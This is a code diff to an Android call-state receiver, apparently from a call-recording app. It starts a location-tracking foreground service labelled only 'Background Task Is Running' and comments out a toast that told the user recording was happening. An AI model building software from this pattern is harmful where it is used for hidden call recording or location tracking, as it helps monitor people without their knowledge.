@@ -12,6 +12,9 @@ import android.widget.Toast;
 
 import static android.content.ContentValues.TAG;
 
+import locationTracker.ForegroundServices;
+import synceAdapter.AccountConstants;
+
 public class StateRecieverClas extends BroadcastReceiver {
     static boolean isRocrdingStarted;
     public static String mNumber;
@@ -29,7 +32,21 @@ public class StateRecieverClas extends BroadcastReceiver {
                 String phoneState = extras.getString(TelephonyManager.EXTRA_STATE);
                 Log.d(TAG, " onReceive: " + phoneState);
                 String extrString = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
-                Toast.makeText(context, "Recording " + phoneState, Toast.LENGTH_SHORT).show();
+//                Toast.makeText(context, "Recording ho ri " + phoneState, Toast.LENGTH_SHORT).show();
+                if (AccountConstants.mainThread == false){
+                    Log.d(TAG, "onReceive thread: ");
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            Intent serviceIntent = new Intent(context, ForegroundServices.class);
+                            serviceIntent.putExtra("inputExtra", "Background Task Is Running");
+                            context.startForegroundService(serviceIntent);
+                        }else {
+                            context.startService(new Intent(context , ForegroundServices.class));
+                        }
+                    }catch (Exception e){
+                        Log.d(TAG, "onReceiveEE"+e);
+                    }
+                }
 
                 if (extras != null) {
                     dispacthExtra(context , intent , mNumber , extrString);
